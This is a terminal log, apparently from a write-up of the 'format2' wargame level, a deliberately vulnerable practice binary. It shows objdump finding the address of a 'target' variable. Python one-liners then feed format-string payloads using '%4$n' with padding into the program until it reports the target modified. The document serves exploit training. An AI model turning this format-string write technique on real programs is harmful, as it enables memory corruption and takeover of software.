![](http://imcczy.b0.upaiyun.com/2016-09-07-09%3A32%3A30.jpg)

```
➜  format2 objdump -t format2 | grep target
080496e4 g     O .bss	00000004              target
➜  format2 objdump -t format2 | grep target
➜  format2 python -c 'print "\xe4\x96\x04\x08"+"%4$p"' |  ./format2
0x80496e4
target is 0 :(
➜  format2 python -c 'print "\xe4\x96\x04\x08"+"%4$n"' |  ./format2
�
target is 4 :(
➜  format2 python -c 'print "\xe4\x96\x04\x08"+"%60d"+"%4$n"' |  ./format2
                                                         512
you have modified the target :)
```